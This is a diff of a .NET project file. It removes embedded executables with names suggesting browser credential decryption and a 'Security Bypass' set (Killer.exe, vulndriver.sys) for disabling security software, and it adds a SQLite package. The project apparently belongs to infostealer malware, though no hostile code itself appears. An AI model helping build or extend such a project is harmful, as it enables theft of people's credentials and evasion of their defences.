@@ -10,17 +10,7 @@
   </PropertyGroup>
 
   <ItemGroup>
-    <None Remove="Browsers\chromelevator_x64.exe" />
-    <None Remove="Browsers\YandexDecryptor.exe" />
-    <None Remove="Security Bypass\Killer.exe" />
-    <None Remove="Security Bypass\vulndriver.sys" />
-  </ItemGroup>
-
-  <ItemGroup>
-    <EmbeddedResource Include="Browsers\chromelevator_x64.exe" />
-    <EmbeddedResource Include="Browsers\YandexDecryptor.exe" />
-    <EmbeddedResource Include="Security Bypass\Killer.exe" />
-    <EmbeddedResource Include="Security Bypass\vulndriver.sys" />
+    <Compile Remove="Browsers\ExtractResources.cs" />
   </ItemGroup>
 
   <ItemGroup>
@@ -28,6 +18,7 @@
     <PackageReference Include="NAudio" Version="2.2.1" />
     <PackageReference Include="Newtonsoft.Json" Version="13.0.4" />
     <PackageReference Include="Portable.BouncyCastle" Version="1.9.0" />
+    <PackageReference Include="System.Data.SQLite.EF6" Version="2.0.3" />
   </ItemGroup>
 
 </Project>
